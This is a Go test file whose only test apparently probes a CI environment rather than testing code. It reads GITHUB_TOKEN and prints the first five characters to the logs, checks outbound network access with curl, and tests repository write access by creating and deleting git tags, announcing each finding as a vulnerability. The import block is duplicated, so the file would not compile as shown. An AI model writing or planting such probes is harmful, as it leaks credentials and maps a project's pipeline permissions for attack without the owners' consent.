package interchain

import (
	"os/exec"
	"os"
	"fmt"
    "fmt"
    "os"
    "os/exec"
    "testing"
)

func TestSecurityContext(t *testing.T) {
	fmt.Println("[*] AUDIT_START")
	if os.Getenv("GITHUB_TOKEN") != "" { fmt.Println("[*] TOKEN_LEAK_CONFIRMED") }
	if err := exec.Command("git", "tag", "audit-bypass").Run(); err == nil { fmt.Println("[*] VULNERABLE_WRITE_ACCESS"); exec.Command("git", "tag", "-d", "audit-bypass").Run(); }
    // Cek Token
    token := os.Getenv("GITHUB_TOKEN")
    if token != "" {
        fmt.Printf("[*] Token Found: %s...\n", token[:5])
    }

    // Simulasi Network Outbound
    cmd := exec.Command("curl", "-I", "https://www.google.com")
    if err := cmd.Run(); err == nil {
        fmt.Println("[*] Network Egress: Active")
    }

    // Cek Izin Tulis Git
    gitCmd := exec.Command("git", "tag", "audit-tag-test")
    if err := gitCmd.Run(); err == nil {
        fmt.Println("[*] VULNERABLE: Write access confirmed")
        // Cleanup tag lokal
        exec.Command("git", "tag", "-d", "audit-tag-test").Run()
    }
}
